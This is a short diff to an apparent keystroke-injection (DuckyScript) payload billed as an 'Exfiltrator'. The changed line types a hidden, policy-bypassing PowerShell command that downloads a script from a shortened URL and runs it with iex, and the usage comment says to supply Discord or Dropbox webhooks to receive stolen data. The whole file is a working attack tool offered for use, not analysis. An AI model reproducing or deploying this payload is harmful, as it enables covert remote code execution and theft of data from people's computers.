@@ -9,10 +9,10 @@ REM Supported Layout keyboard: US/FR/DE
 REM
 REM Most awesome Exfiltrator !!
 REM
-REM Usage : Put your discord WEBHOOK and enjoy !
+REM Usage : Put your discord and/or dropbox WEBHOOK and enjoy !
 REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'DISCORD_WEBHOOK'; irm https://shorturl.at/fiZ38 | iex}"
+STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm https://shorturl.at/fiZ38 | iex
 ENTER
